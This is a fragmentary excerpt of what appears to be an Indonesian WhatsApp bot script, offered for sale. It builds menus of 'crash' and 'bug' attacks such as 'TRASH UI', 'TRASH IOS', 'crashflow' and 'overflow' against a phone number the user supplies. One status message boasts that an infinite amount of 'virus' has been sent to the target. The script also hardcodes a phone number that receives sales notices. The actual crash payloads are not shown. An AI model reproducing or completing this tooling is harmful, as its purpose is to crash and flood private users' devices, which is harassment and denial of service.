/*
 HALO GW PUTRA DEV DISINI INGIN MENGUCAPKAN TERIMAKASIH KEPADA PEMBUAT SC GW BERIKUT DEV SC
 - PUTRA (DEV)
 -JAY (OWNER)
 -SRULZ (OWNER)
*/
...
"A͓̽P͓̽O͓̽", 
"A͓̽P͓̽O͓̽L͓̽O͓̽",
"A͓̽P͓̽O͓̽L͓̽O͓̽N͓̽I͓̽ B͓̽O͓̽S͓̽", 
]
...
"buttonParamsJson": JSON.stringify(listMessage) 
 ...
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.com/@putratyy\",\"merchant_url\":\"https://youtube.com/@putratyy\"}"
}]
}) 
})} 
...
let listMessage = {
    title: '© P͓̽O͓̽L͓̽O͓̽A͓̽P͓̽O͓̽L͓̽O͓̽', 
    sections
};
...
let listMessage = {
    title: 'A͓̽P͓̽O͓̽L͓̽L͓̽O͓̽C͓̽R͓̽A͓̽S͓̽H͓̽', 
    sections
};
...
zyn.sendMessage("6283123402262@s.whatsapp.net", { text: "BANG TORA ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break
...
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
    ...
    𝐍𝐎𝐓𝐄
> VIRUS SUDAH TERKIRIM DENGAN JUMLAH INFINITY UNTUK STOP BLOCK TARGET`)
break
...
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ C͓̽R͓̽A͓̽S͓̽H͓̽ ⌟',
						highlight_label: "T҉H҉E҉ C҉R҉A҉S҉G҉",
						rows: [{
							title: 'T͓̽R͓̽A͓̽S͓̽H͓̽ U͓̽I͓̽',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "S͓̽U͓̽P͓̽E͓̽R͓̽ B͓̽O͓̽O͓̽T͓̽S͓̽",
						rows: [{
							title: 'X͓̽A͓̽N͓̽A͓̽P͓̽ B͓̽U͓̽G͓̽',
							id: `R͓̽O͓̽X͓̽ ${target}`
						}]
					},
					{
						highlight_label: "T͓̽O͓̽R͓̽A͓̽ B͓̽U͓̽G͓̽",
						rows: [{
							title: 'A͓̽T͓̽T͓̽A͓̽C͓̽K͓̽ B͓̽O͓̽T͓̽T͓̽S͓̽',
							id: `attack ${target}`
						}]
					},
					{
						title: '⌜ P͓̽O͓̽V͓̽A͓̽ ⌟',
						highlight_label: "T͓̽R͓̽A͓̽S͓̽H͓̽ I͓̽O͓̽S͓̽",
						rows: [{
							title: 'T͓̽R͓̽A͓̽S͓̽H͓̽I͓̽P͓̽',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: "B͓̽O͓̽O͓̽S͓̽T͓̽E͓̽R͓̽I͓̽P͓̽",
						rows: [{
							title: 'C͓̽L͓̽E͓̽A͓̽R͓̽I͓̽P͓̽',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "M͓̽I͓̽X͓̽I͓̽P͓̽",
						rows: [{
							title: 'E͓̽S͓̽T͓̽U͓̽N͓̽D͓̽O͓̽',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜ A͓̽P͓̽L͓̽ ⌟',
						highlight_label: "P͓̽O͓̽V͓̽A͓̽I͓̽O͓̽S͓̽",
						rows: [{
							title: 'C͓̽O͓̽V͓̽A͓̽ I͓̽P͓̽',
							id: `crashflow ${target}`
						}]
					},
					{
						highlight_label: "B͓̽U͓̽T͓̽A͓̽N͓̽D͓̽O͓̽I͓̽P͓̽",
						rows: [{
							title: 'D͓̽V͓̽X͓̽',
							id: `vasion ${target}`
						}]
					...
					{
						highlight_label: "T͓̽O͓̽R͓̽A͓̽M͓̽I͓̽X͓̽",
						rows: [{
							title: 'P͓̽R͓̽E͓̽M͓̽I͓̽U͓̽M͓̽ B͓̽U͓̽G͓̽',
							id: `overflow ${target}`
						}]
					}]
let listMessage = {
